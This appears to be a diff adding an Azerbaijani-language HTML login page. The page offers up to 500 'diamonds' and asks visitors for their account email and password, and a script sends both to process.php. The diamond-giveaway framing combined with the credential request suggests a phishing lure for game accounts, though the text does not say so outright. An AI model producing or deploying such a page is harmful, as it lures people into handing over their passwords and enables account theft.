@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Səhifəsi</title>
+    <style>
+        body {
+            background: url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .container h2 {
+            margin-bottom: 15px;
+        }
+        .note {
+            margin-top: 10px;
+            font-size: 14px;
+            color: gray;
+        }
+        .input-group {
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+        }
+        .input-group input {
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        button {
+            background-color: green;
+            border: 0px;
+            border-radius: 10px;
+            color: white;
+            height: 30px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: rgb(0, 204, 0);
+        }
+        .response-message {
+            margin-top: 10px;
+            font-size: 14px;
+            color: blue;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Hesabınıza Giriş Edin</h2>
+        <p class="note">Xoş gəlmisiniz! Zəhmət olmasa, daxil olun.</p>
+        <p class="note">Dəstəklənən Hesaplar: SS.</p>
+        <form id="myForm">
+            <div class="input-group">
+                <input type="email" name="email" placeholder="Email" required>
+                <input type="password" name="password" placeholder="Şifrə" required>
+                <input type="number" name="elmas" placeholder="Elmas Miqdarı. Max:500" min="1" max="500" required>
+            </div>
+            <button type="submit">Göndər</button>
+        </form>
+        <p class="response-message" id="responseMessage"></p>
+    </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Səhifənin yenilənməsinin qarşısını alırıq
+            var formData = new FormData(this);
+
+            fetch("process.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("responseMessage").innerText = "Məlumat göndərildi: " + data;
+            })
+            .catch(error => {
+                document.getElementById("responseMessage").innerText = "Xəta baş verdi!";
+                console.error("Xəta baş verdi:", error);
+            });
+        });
+    </script>
+</body>
+</html>
